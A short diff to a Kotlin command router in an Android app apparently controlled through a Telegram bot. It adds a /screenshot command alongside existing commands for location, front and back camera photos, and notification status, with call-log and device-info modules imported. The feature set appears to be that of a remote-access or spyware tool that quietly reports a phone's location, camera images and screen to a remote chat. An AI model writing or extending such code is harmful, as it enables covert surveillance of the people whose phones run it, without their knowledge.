@@ -1,12 +1,14 @@
 package com.rtk.telegrammanager.telegram
 
 import android.content.Context
+import android.content.Intent
+import com.rtk.telegrammanager.screen.ScreenCaptureActivity
 import com.rtk.telegrammanager.calls.CallLogManager
 import com.rtk.telegrammanager.device.DeviceInfo
 import com.rtk.telegrammanager.modulemanager.ModuleManager
 
 class CommandRouter(
-    context: Context
+    private val context: Context
 ) {
 
     private val device = DeviceInfo(context.applicationContext)
@@ -51,6 +53,7 @@ class CommandRouter(
                 /camera_front - Take front photo
                 /camera_back - Take back photo
                 /notification_status - Current notifications
+                /screenshot - Capture current screen layout
                 🔐 Security:
                 Only authorized Chat ID can execute commands.
             """.trimIndent()
@@ -73,6 +76,9 @@ class CommandRouter(
             "/location" -> "LOCATION_REQUEST"
             "/camera_front" -> "CAMERA_FRONT_REQUEST"
             "/camera_back" -> "CAMERA_BACK_REQUEST"
+            "/screenshot" -> {
+                "SCREENSHOT_REQUEST"
+            }
             "/notification_status" ->
                    if (moduleManager.isEnabled("notification"))
                        "NOTIFICATION_STATUS_REQUEST"
